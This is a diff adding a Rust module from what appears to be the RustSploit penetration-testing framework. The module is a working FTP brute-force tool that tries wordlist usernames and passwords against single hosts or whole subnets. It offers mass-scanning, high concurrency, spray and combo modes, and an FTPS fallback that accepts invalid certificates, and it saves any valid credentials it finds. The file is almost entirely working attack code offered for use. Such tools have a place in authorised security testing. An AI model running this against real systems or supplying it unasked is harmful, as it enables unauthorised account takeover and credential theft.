@@ -1,0 +1,497 @@
+use anyhow::{Context, Result, anyhow};
+use colored::*;
+use std::{net::IpAddr, time::Duration};
+use suppaftp::async_native_tls::TlsConnector;
+use suppaftp::tokio::{AsyncFtpStream, AsyncNativeTlsConnector, AsyncNativeTlsFtpStream};
+use tokio::time::sleep;
+
+use crate::module::{Finding, FindingKind, ModuleCtx, ModuleOutcome};
+use crate::utils::{
+    BruteforceConfig, LoginResult, SubnetScanConfig, is_subnet_target, load_credential_file,
+    parse_combo_mode, run_bruteforce_streaming, run_subnet_bruteforce,
+};
+use crate::utils::{
+    STREAMING_THRESHOLD, cfg_prompt_default, cfg_prompt_existing_file, cfg_prompt_int_range,
+    cfg_prompt_output_file, cfg_prompt_port, cfg_prompt_yes_no, file_size, load_lines,
+    load_lines_uncapped,
+};
+
+pub fn info() -> crate::module_info::ModuleInfo {
+    crate::module_info::ModuleInfo {
+        name: "FTP Brute Force".to_string(),
+        description: "Brute-force FTP authentication with support for FTPS (TLS), combo mode, concurrent connections, and subnet/mass scanning.".to_string(),
+        authors: vec!["RustSploit Contributors".to_string()],
+        references: vec![],
+        disclosure_date: None,
+        rank: crate::module_info::ModuleRank::Normal,
+        default_port: Some(21),
+    }
+}
+
+const DEFAULT_TIMEOUT_SECS: u64 = 10;
+
+/// FTP error classification for retry decisions.
+#[derive(Debug, Clone, Copy)]
+enum FtpErrorType {
+    AuthenticationFailed,
+    TlsRequired,
+    ConnectionLimitExceeded,
+    ConnectionFailed,
+    Unknown,
+}
+
+impl FtpErrorType {
+    fn classify_error(msg: &str) -> Self {
+        let msg_lower = msg.to_lowercase();
+        if msg.contains("530")
+            || msg_lower.contains("login incorrect")
+            || (msg_lower.contains("user") && msg_lower.contains("cannot"))
+            || (msg_lower.contains("password") && msg_lower.contains("incorrect"))
+        {
+            return Self::AuthenticationFailed;
+        }
+        if msg.contains("550 SSL")
+            || msg_lower.contains("tls required")
+            || msg_lower.contains("ssl connection required")
+            || msg.contains("220 TLS go first")
+            || msg_lower.contains("must use tls")
+        {
+            return Self::TlsRequired;
+        }
+        if msg.contains("421")
+            || msg_lower.contains("too many")
+            || msg_lower.contains("connection limit")
+        {
+            return Self::ConnectionLimitExceeded;
+        }
+        if msg_lower.contains("connection refused")
+            || msg_lower.contains("no route to host")
+            || msg_lower.contains("network unreachable")
+            || msg_lower.contains("connection reset")
+        {
+            return Self::ConnectionFailed;
+        }
+        Self::Unknown
+    }
+
+    fn is_retryable(self) -> bool {
+        matches!(self, Self::ConnectionFailed | Self::Unknown)
+    }
+}
+
+fn display_banner() {
+    if crate::utils::is_batch_mode() {
+        return;
+    }
+    crate::mprintln!(
+        "{}",
+        "╔═══════════════════════════════════════════════════════════╗".cyan()
+    );
+    crate::mprintln!(
+        "{}",
+        "║   FTP Brute Force Module                                  ║".cyan()
+    );
+    crate::mprintln!(
+        "{}",
+        "║   Supports IPv4/IPv6 & Mass Scanning (Hose Mode)          ║".cyan()
+    );
+    crate::mprintln!(
+        "{}",
+        "╚═══════════════════════════════════════════════════════════╝".cyan()
+    );
+    crate::mprintln!();
+}
+
+/// Format IPv4 or IPv6 addresses with port for display.
+fn format_addr(target: &str, port: u16) -> String {
+    if (target.starts_with('[') && target.contains("]:"))
+        || (target.matches(':').count() == 1 && !target.contains('['))
+    {
+        target.to_string()
+    } else {
+        let clean = if target.starts_with('[') && target.ends_with(']') {
+            &target[1..target.len() - 1]
+        } else {
+            target
+        };
+        if clean.contains(':') {
+            format!("[{}]:{}", clean, port)
+        } else {
+            format!("{}:{}", clean, port)
+        }
+    }
+}
+
+pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
+    let target = ctx
+        .target
+        .as_single()
+        .context("ftp_bruteforce requires a single-host target")?;
+    display_banner();
+
+    // --- Subnet Scan Mode ---
+    if is_subnet_target(target) {
+        crate::mprintln!("{}", format!("[*] Target: {} (Subnet Scan)", target).cyan());
+
+        let port = cfg_prompt_port("port", "FTP Port", 21).await?;
+        let usernames_file =
+            cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
+        let passwords_file =
+            cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
+        let users = load_lines(&usernames_file)?;
+        let passes = load_lines(&passwords_file)?;
+        if users.is_empty() {
+            return Err(anyhow!("User list empty"));
+        }
+        if passes.is_empty() {
+            return Err(anyhow!("Pass list empty"));
+        }
+
+        let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent hosts", 50, 1, 10000)
+            .await? as usize;
+        let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
+        let timeout_secs: u64 = cfg_prompt_int_range(
+            "timeout",
+            "Connection timeout (seconds)",
+            DEFAULT_TIMEOUT_SECS as i64,
+            1,
+            120,
+        )
+        .await? as u64;
+        let output_file = cfg_prompt_output_file(
+            "output_file",
+            "Output result file",
+            "ftp_subnet_results.txt",
+        )
+        .await?;
+
+        let timeout_dur = Duration::from_secs(timeout_secs);
+        let hits = run_subnet_bruteforce(
+            target,
+            port,
+            users,
+            passes,
+            &SubnetScanConfig {
+                concurrency,
+                verbose,
+                output_file,
+                service_name: "ftp",
+                jitter_ms: 50,
+                source_module: "creds/generic/ftp_credcheck",
+                skip_tcp_check: false,
+                state_file: None,
+            },
+            move |ip: IpAddr, port: u16, user: String, pass: String| {
+                let timeout_dur = timeout_dur;
+                async move {
+                    let addr = format!("{}:{}", ip, port);
+                    match try_ftp_login(&addr, &ip.to_string(), &user, &pass, false, timeout_dur)
+                        .await
+                    {
+                        Ok(true) => LoginResult::Success,
+                        Ok(false) => LoginResult::AuthFailed,
+                        Err(e) => {
+                            let et = FtpErrorType::classify_error(&e.to_string());
+                            LoginResult::Error {
+                                message: e.to_string(),
+                                retryable: et.is_retryable(),
+                            }
+                        }
+                    }
+                }
+            },
+        )
+        .await?;
+        let mut outcome = ModuleOutcome::ok();
+        for (host, user, pass) in &hits {
+            outcome.findings.push(Finding {
+                target: host.clone(),
+                kind: FindingKind::Credential,
+                message: format!("Valid FTP credentials found: {}:{}", user, pass),
+                data: Some(serde_json::json!({
+                    "username": user,
+                    "password": pass,
+                    "service": "ftp",
+                    "port": port,
+                })),
+            });
+        }
+        return Ok(outcome);
+    }
+
+    // --- Single Target Mode ---
+    let mut outcome = ModuleOutcome::ok();
+    crate::mprintln!("{}", format!("[*] Target: {}", target).cyan());
+
+    let port = cfg_prompt_port("port", "FTP Port", 21).await?;
+    let usernames_file =
+        cfg_prompt_existing_file("username_wordlist", "Username wordlist file").await?;
+    let passwords_file =
+        cfg_prompt_existing_file("password_wordlist", "Password wordlist file").await?;
+    let concurrency =
+        cfg_prompt_int_range("concurrency", "Max concurrent tasks", 500, 1, 10000).await? as usize;
+    let stop_on_success =
+        cfg_prompt_yes_no("stop_on_success", "Stop on first success?", true).await?;
+    let save_results = cfg_prompt_yes_no("save_results", "Save results to file?", true).await?;
+    let save_path = if save_results {
+        let default_name = format!(
+            "ftp_results_{}.txt",
+            target.replace(['/', ':', '.', '[', ']', '\\'], "_")
+        );
+        Some(cfg_prompt_output_file("output_file", "Output file", &default_name).await?)
+    } else {
+        None
+    };
+    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
+    let timeout_secs: u64 = cfg_prompt_int_range(
+        "timeout",
+        "Connection timeout (seconds)",
+        DEFAULT_TIMEOUT_SECS as i64,
+        1,
+        120,
+    )
+    .await? as u64;
+    let timeout_dur = Duration::from_secs(timeout_secs);
+    let combo_input =
+        cfg_prompt_default("combo_mode", "Combo mode (linear/combo/spray)", "combo").await?;
+
+    let users = load_lines(&usernames_file)?;
+    if users.is_empty() {
+        crate::mprintln!("[!] Username wordlist is empty or invalid. Exiting.");
+        return Ok(ModuleOutcome::ok());
+    }
+    crate::mprintln!("{}", format!("[*] Loaded {} usernames", users.len()).cyan());
+
+    let passes = if file_size(&passwords_file) > STREAMING_THRESHOLD {
+        crate::mprintln!(
+            "{}",
+            "[*] Large password file — will stream in batches".cyan()
+        );
+        Vec::new()
+    } else {
+        let p = load_lines_uncapped(&passwords_file)?;
+        if p.is_empty() {
+            crate::mprintln!("[!] Password wordlist is empty or invalid. Exiting.");
+            return Ok(ModuleOutcome::ok());
+        }
+        crate::mprintln!("{}", format!("[*] Loaded {} passwords", p.len()).cyan());
+        p
+    };
+
+    let extra_combos = if cfg_prompt_yes_no(
+        "cred_file",
+        "Load additional user:pass combos from file?",
+        false,
+    )
+    .await?
+    {
+        let cred_path =
+            cfg_prompt_existing_file("cred_file_path", "Credential file (user:pass per line)")
+                .await?;
+        load_credential_file(&cred_path)?
+    } else {
+        Vec::new()
+    };
+    let combo_mode = parse_combo_mode(&combo_input);
+    let passwords_file_ref = passwords_file.clone();
+
+    // Capture verbose in the closure for try_ftp_login
+    let target_owned = target.to_string();
+    let limiter = ctx.limiter.clone();
+    let module_path = ctx.module_path.clone();
+    let try_login = move |t: String, p: u16, user: String, pass: String| {
+        let addr = format_addr(&t, p);
+        let verbose_flag = verbose;
+        let limiter = limiter.clone();
+        let module_path = module_path.clone();
+        let timeout_dur = timeout_dur;
+        async move {
+            limiter.acquire(&module_path, &t).await;
+            match try_ftp_login(&addr, &t, &user, &pass, verbose_flag, timeout_dur).await {
+                Ok(true) => LoginResult::Success,
+                Ok(false) => LoginResult::AuthFailed,
+                Err(e) => {
+                    let et = FtpErrorType::classify_error(&e.to_string());
+                    LoginResult::Error {
+                        message: e.to_string(),
+                        retryable: et.is_retryable(),
+                    }
+                }
+            }
+        }
+    };
+
+    let delay_ms =
+        cfg_prompt_int_range("delay_ms", "Delay between attempts (ms)", 0, 0, 10000).await? as u64;
+    let max_retries =
+        cfg_prompt_int_range("max_retries", "Max retries on error", 3, 0, 10).await? as usize;
+
+    let result = run_bruteforce_streaming(
+        &BruteforceConfig {
+            target: target_owned,
+            port,
+            concurrency,
+            stop_on_success,
+            verbose,
+            delay_ms,
+            max_retries,
+            service_name: "ftp",
+            jitter_ms: 50,
+            source_module: "creds/generic/ftp_credcheck",
+        },
+        users,
+        Some(&passwords_file_ref),
+        passes,
+        combo_mode,
+        extra_combos,
+        try_login,
+    )
+    .await?;
+
+    result.print_found();
+    if let Some(path) = save_path {
+        result.save_to_file(&path)?;
+    }
+
+    for (host, user, pass) in &result.found {
+        outcome.findings.push(Finding {
+            target: host.clone(),
+            kind: FindingKind::Credential,
+            message: format!("Valid FTP credentials found: {}:{}", user, pass),
+            data: Some(serde_json::json!({
+                "username": user,
+                "password": pass,
+                "service": "ftp",
+                "port": port,
+            })),
+        });
+    }
+    Ok(outcome)
+}
+
+/// Try FTP login with FTPS fallback when TLS is required.
+async fn try_ftp_login(
+    addr: &str,
+    target: &str,
+    user: &str,
+    pass: &str,
+    verbose: bool,
+    timeout: Duration,
+) -> Result<bool> {
+    // Attempt plain FTP via source-port-aware TCP wrapper
+    let tcp_result = tokio::time::timeout(
+        timeout,
+        crate::utils::network::tcp_connect_str(addr, timeout),
+    )
+    .await;
+    match tcp_result {
+        Ok(Ok(tcp_stream)) => match AsyncFtpStream::connect_with_stream(tcp_stream).await {
+            Ok(mut ftp) => {
+                match ftp.login(user, pass).await {
+                    Ok(_) => {
+                        if let Err(e) = ftp.quit().await {
+                            crate::meprintln!("[!] FTP quit error: {}", e);
+                        }
+                        return Ok(true);
+                    }
+                    Err(e) => {
+                        let msg = e.to_string();
+                        match FtpErrorType::classify_error(&msg) {
+                            FtpErrorType::AuthenticationFailed => return Ok(false),
+                            FtpErrorType::TlsRequired => {
+                                if let Err(e) = ftp.quit().await {
+                                    crate::meprintln!("[!] FTP quit error: {}", e);
+                                }
+                            }
+                            FtpErrorType::ConnectionLimitExceeded => {
+                                sleep(Duration::from_secs(1)).await;
+                                return Err(anyhow!("Connection limit exceeded (421)"));
+                            }
+                            // A connection drop DURING login (after a successful
+                            // handshake) is genuinely transient → retryable Error.
+                            FtpErrorType::ConnectionFailed => {
+                                return Err(anyhow!("FTP connection error during login: {}", msg));
+                            }
+                            // Any other post-handshake login error means the server
+                            // completed the handshake and then rejected the login
+                            // with unusual wording (e.g. 430/532 or a localized
+                            // message). That's a definitive auth result, not a
+                            // transient fault — returning it as a retryable Error
+                            // tripped the consecutive-error lockout on healthy hosts.
+                            FtpErrorType::Unknown => {
+                                tracing::debug!(
+                                    "FTP login rejected ({}): treating as auth failure",
+                                    msg
+                                );
+                                return Ok(false);
+                            }
+                        }
+                    }
+                }
+            }
+            Err(e) => return Err(anyhow!("FTP handshake error: {}", e)),
+        },
+        Ok(Err(e)) => return Err(e.into()),
+        Err(e) => return Err(anyhow!("Timeout: {e}")),
+    }
+
+    // FTPS fallback
+    if verbose {
+        crate::mprintln!("  [v] {} — trying FTPS (TLS)...", addr);
+    }
+    let tcp_stream_tls = match tokio::time::timeout(
+        timeout,
+        crate::utils::network::tcp_connect_str(addr, timeout),
+    )
+    .await
+    {
+        Ok(Ok(s)) => s,
+        Ok(Err(e)) => return Err(anyhow!("FTPS TCP connect failed: {}", e)),
+        Err(e) => return Err(anyhow!("FTPS connect timed out: {}", e)),
+    };
+
+    let ftp_plain_tls = match AsyncNativeTlsFtpStream::connect_with_stream(tcp_stream_tls).await {
+        Ok(s) => s,
+        Err(e) => return Err(anyhow!("FTPS FTP handshake failed: {}", e)),
+    };
+
+    let connector = AsyncNativeTlsConnector::from(
+        TlsConnector::new()
+            .danger_accept_invalid_certs(!crate::utils::network::get_global_strict_tls())
+            .danger_accept_invalid_hostnames(true),
+    );
+
+    let domain = if target.starts_with('[') {
+        target
+            .trim_start_matches('[')
+            .split(']')
+            .next()
+            .unwrap_or(target)
+    } else {
+        target.split(':').next().unwrap_or(target)
+    };
+
+    let mut ftp_tls = match ftp_plain_tls.into_secure(connector, domain).await {
+        Ok(s) => s,
+        Err(e) => return Err(anyhow!("TLS Upgrade: {}", e)),
+    };
+
+    match ftp_tls.login(user, pass).await {
+        Ok(_) => {
+            if let Err(e) = ftp_tls.quit().await {
+                crate::meprintln!("[!] FTP quit error: {}", e);
+            }
+            Ok(true)
+        }
+        Err(e) => match FtpErrorType::classify_error(&e.to_string()) {
+            FtpErrorType::AuthenticationFailed => Ok(false),
+            _ => Err(anyhow!("FTPS Error: {}", e)),
+        },
+    }
+}
+
+crate::register_native_module!(
+    crate::module::Category::Creds,
+    "generic/ftp_bruteforce",
+    native
+);
